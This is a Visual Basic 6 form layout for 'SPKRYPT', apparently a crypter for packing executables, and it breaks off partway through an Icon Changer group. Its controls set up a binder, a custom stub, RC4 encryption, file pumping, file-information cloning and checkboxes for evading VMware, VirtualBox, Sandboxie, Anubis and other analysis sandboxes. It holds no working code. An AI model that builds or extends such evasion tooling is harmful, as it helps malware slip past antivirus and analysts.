VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.2#0"; "CODEJO~1.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "  SPKRYPT | Private version for: SpK"
   ClientHeight    =   6165
   ClientLeft      =   3405
   ClientTop       =   3510
   ClientWidth     =   7530
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6165
   ScaleWidth      =   7530
   Begin XtremeSuiteControls.GroupBox grpAll 
      Height          =   3975
      Left            =   2520
      TabIndex        =   2
      Top             =   1440
      Width           =   4935
      _Version        =   851970
      _ExtentX        =   8705
      _ExtentY        =   7011
      _StockProps     =   79
      Caption         =   "      Settings"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.GroupBox grpPump 
         Height          =   1095
         Left            =   120
         TabIndex        =   57
         Top             =   2640
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "      File Pumper"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton cmdMore100 
            Height          =   255
            Left            =   3960
            TabIndex        =   64
            Top             =   720
            Width           =   615
            _Version        =   851970
            _ExtentX        =   1085
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "+ 100"
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton cmdLess100 
            Height          =   255
            Left            =   1320
            TabIndex        =   63
            Top             =   720
            Width           =   615
            _Version        =   851970
            _ExtentX        =   1085
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "- 100"
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkPump 
            Height          =   255
            Left            =   240
            TabIndex        =   62
            Top             =   360
            Width           =   1695
            _Version        =   851970
            _ExtentX        =   2990
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Enable File Pumper"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton cmdMore 
            Height          =   255
            Left            =   3480
            TabIndex        =   61
            Top             =   720
            Width           =   495
            _Version        =   851970
            _ExtentX        =   873
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "+"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton cmdLess 
            Height          =   255
            Left            =   1920
            TabIndex        =   60
            Top             =   720
            Width           =   495
            _Version        =   851970
            _ExtentX        =   873
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "-"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.FlatEdit txtPump 
            Height          =   255
            Left            =   2520
            TabIndex        =   58
            Top             =   720
            Width           =   855
            _Version        =   851970
            _ExtentX        =   1508
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "0"
            Alignment       =   2
         End
         Begin XtremeSuiteControls.Label Label2 
            Height          =   255
            Left            =   2160
            TabIndex        =   65
            Top             =   360
            Width           =   2175
            _Version        =   851970
            _ExtentX        =   3836
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "1000 kb = 1 mb"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.Image Image15 
            Height          =   240
            Left            =   120
            Picture         =   "frmMain.frx":16AC2
            Top             =   0
            Width           =   240
         End
         Begin XtremeSuiteControls.Label Label1 
            Height          =   255
            Left            =   240
            TabIndex        =   59
            Top             =   720
            Width           =   975
            _Version        =   851970
            _ExtentX        =   1720
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Kb's to Add:"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
      End
      Begin XtremeSuiteControls.GroupBox grpExtra 
         Height          =   975
         Left            =   120
         TabIndex        =   21
         Top             =   1560
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   1720
         _StockProps     =   79
         Caption         =   "         Extra Stuff"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton cmdHelpRADX 
            Height          =   150
            Left            =   4200
            TabIndex        =   22
            Top             =   360
            Width           =   135
            _Version        =   851970
            _ExtentX        =   238
            _ExtentY        =   265
            _StockProps     =   79
            Caption         =   "?"
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkPADX 
            Height          =   255
            Left            =   2880
            TabIndex        =   23
            Top             =   360
            Width           =   1335
            _Version        =   851970
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Remove PADX"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton cmdEOFHelp 
            Height          =   135
            Left            =   2640
            TabIndex        =   24
            Top             =   360
            Width           =   135
            _Version        =   851970
            _ExtentX        =   238
            _ExtentY        =   238
            _StockProps     =   79
            Caption         =   "?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkEOF 
            Height          =   255
            Left            =   1680
            TabIndex        =   25
            Top             =   360
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "EOF Data"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkRPE 
            Height          =   255
            Left            =   360
            TabIndex        =   26
            Top             =   360
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Realign PE"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image5 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":16D38
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpClone 
         Height          =   1095
         Left            =   120
         TabIndex        =   31
         Top             =   1560
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "         File Information Cloner"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtClone 
            Height          =   255
            Left            =   240
            TabIndex        =   32
            Top             =   720
            Width           =   4095
            _Version        =   851970
            _ExtentX        =   7223
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Click to browse for file to clone..."
         End
         Begin XtremeSuiteControls.CheckBox chkClone 
            Height          =   255
            Left            =   240
            TabIndex        =   33
            Top             =   360
            Width           =   2295
            _Version        =   851970
            _ExtentX        =   4048
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Clone File Information?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image7 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":16EB2
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpSections 
         Height          =   1095
         Left            =   120
         TabIndex        =   16
         Top             =   360
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "       Add Sections"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.CheckBox method2 
            Height          =   135
            Left            =   3000
            TabIndex        =   17
            Top             =   360
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   238
            _StockProps     =   79
            Caption         =   "Method 2"
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton s1 
            Height          =   255
            Left            =   3960
            TabIndex        =   18
            Top             =   720
            Width           =   255
            _Version        =   851970
            _ExtentX        =   450
            _ExtentY        =   450
            _StockProps     =   79
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
            Picture         =   "frmMain.frx":16FDF
         End
         Begin XtremeSuiteControls.CheckBox chkSections 
            Height          =   255
            Left            =   240
            TabIndex        =   19
            Top             =   360
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Add Sections?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.FlatEdit txtS1 
            Height          =   255
            Left            =   240
            TabIndex        =   20
            Top             =   720
            Width           =   3375
            _Version        =   851970
            _ExtentX        =   5953
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
         End
         Begin VB.Image Image8 
            Height          =   240
            Left            =   120
            Picture         =   "frmMain.frx":170F3
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpEOF 
         Height          =   3495
         Left            =   120
         TabIndex        =   3
         Top             =   360
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   6165
         _StockProps     =   79
         Caption         =   "        Read EOF Data"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtREOF 
            Height          =   2895
            Left            =   240
            TabIndex        =   4
            Top             =   360
            Width           =   4215
            _Version        =   851970
            _ExtentX        =   7435
            _ExtentY        =   5106
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "EOF"
            MultiLine       =   -1  'True
         End
         Begin VB.Image Image9 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":17354
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpEnc 
         Height          =   1455
         Left            =   120
         TabIndex        =   27
         Top             =   2280
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   2566
         _StockProps     =   79
         Caption         =   "          Encryption"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton cmdGenKey 
            Height          =   255
            Index           =   0
            Left            =   4200
            TabIndex        =   28
            Top             =   1080
            Width           =   255
            _Version        =   851970
            _ExtentX        =   450
            _ExtentY        =   450
            _StockProps     =   79
            UseVisualStyle  =   -1  'True
            Picture         =   "frmMain.frx":175E6
         End
         Begin XtremeSuiteControls.FlatEdit txtKey 
            Height          =   255
            Left            =   240
            TabIndex        =   29
            Top             =   1080
            Width           =   3855
            _Version        =   851970
            _ExtentX        =   6800
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Key..."
         End
         Begin XtremeSuiteControls.CheckBox chkEncryption 
            Height          =   255
            Left            =   480
            TabIndex        =   30
            Top             =   600
            Width           =   1095
            _Version        =   851970
            _ExtentX        =   1931
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "RC4"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
            Value           =   1
         End
         Begin XtremeSuiteControls.GroupBox frpEncType 
            Height          =   615
            Left            =   240
            TabIndex        =   54
            Top             =   360
            Width           =   4215
            _Version        =   851970
            _ExtentX        =   7435
            _ExtentY        =   1085
            _StockProps     =   79
            Caption         =   "Encryption Type"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image4 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":176FA
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpAlgo 
         Height          =   2055
         Left            =   120
         TabIndex        =   46
         Top             =   240
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   3625
         _StockProps     =   79
         Caption         =   "          Generate  Algorithm"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtAlgo 
            Height          =   1455
            Left            =   120
            TabIndex        =   47
            Top             =   360
            Width           =   4455
            _Version        =   851970
            _ExtentX        =   7858
            _ExtentY        =   2566
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            MultiLine       =   -1  'True
         End
         Begin VB.Image Image13 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":17B23
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpAnti 
         Height          =   3255
         Left            =   120
         TabIndex        =   37
         Top             =   360
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   5741
         _StockProps     =   79
         Caption         =   "         Anti Methods"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.CheckBox chkVMware 
            Height          =   255
            Left            =   2400
            TabIndex        =   38
            Top             =   2640
            Width           =   1335
            _Version        =   851970
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti VMware"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkCWSandbox 
            Height          =   255
            Left            =   480
            TabIndex        =   39
            Top             =   1800
            Width           =   1575
            _Version        =   851970
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti CW Sandbox"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkVPC 
            Height          =   255
            Left            =   2400
            TabIndex        =   40
            Top             =   1800
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Virtual PC"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkVBox 
            Height          =   255
            Left            =   480
            TabIndex        =   41
            Top             =   2640
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Virtual Box"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkJoebox 
            Height          =   255
            Left            =   2400
            TabIndex        =   42
            Top             =   360
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Joebox"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkAnubis 
            Height          =   255
            Left            =   2400
            TabIndex        =   43
            Top             =   960
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Anubis"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkThreatExpert 
            Height          =   255
            Left            =   480
            TabIndex        =   44
            Top             =   960
            Width           =   1695
            _Version        =   851970
            _ExtentX        =   2990
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti ThreatExpert"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkSandboxie 
            Height          =   255
            Left            =   480
            TabIndex        =   45
            Top             =   360
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Sandboxie"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image2 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":17C2F
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpBind 
         Height          =   1095
         Left            =   120
         TabIndex        =   5
         Top             =   1440
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "      Binder"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton cmdBind 
            Height          =   255
            Left            =   3480
            TabIndex        =   6
            Top             =   720
            Width           =   1095
            _Version        =   851970
            _ExtentX        =   1931
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Browse"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            UseVisualStyle  =   -1  'True
            Picture         =   "frmMain.frx":17D53
         End
         Begin XtremeSuiteControls.FlatEdit txtBind 
            Height          =   255
            Left            =   240
            TabIndex        =   7
            Top             =   720
            Width           =   3135
            _Version        =   851970
            _ExtentX        =   5530
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
         End
         Begin XtremeSuiteControls.CheckBox chkBinder 
            Height          =   255
            Left            =   -1320
            TabIndex        =   8
            Top             =   1680
            Width           =   3015
            _Version        =   851970
            _ExtentX        =   5318
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Enable binder"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox chkBind 
            Height          =   255
            Left            =   240
            TabIndex        =   9
            Top             =   360
            Width           =   1455
            _Version        =   851970
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Enable binder"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image12 
            Height          =   240
            Left            =   120
            Picture         =   "frmMain.frx":17E7B
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpStub 
         Height          =   1095
         Left            =   120
         TabIndex        =   13
         Top             =   2640
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "         Custom Stub"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtSplitKey 
            Height          =   255
            Left            =   240
            TabIndex        =   56
            Top             =   720
            Width           =   4095
            _Version        =   851970
            _ExtentX        =   7223
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Split key"
         End
         Begin XtremeSuiteControls.FlatEdit txtStub 
            Height          =   255
            Left            =   240
            TabIndex        =   14
            Top             =   480
            Width           =   4095
            _Version        =   851970
            _ExtentX        =   7223
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Click to browse for custom stub..."
         End
         Begin XtremeSuiteControls.CheckBox chkStub 
            Height          =   255
            Left            =   240
            TabIndex        =   15
            Top             =   240
            Width           =   1575
            _Version        =   851970
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Custom Stub?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image3 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":17FEF
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpIcon 
         Height          =   1215
         Left            =   120
         TabIndex        =   34
         Top             =   360
         Visible         =   0   'False
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   2143
         _StockProps     =   79
         Caption         =   "        Icon Changer"
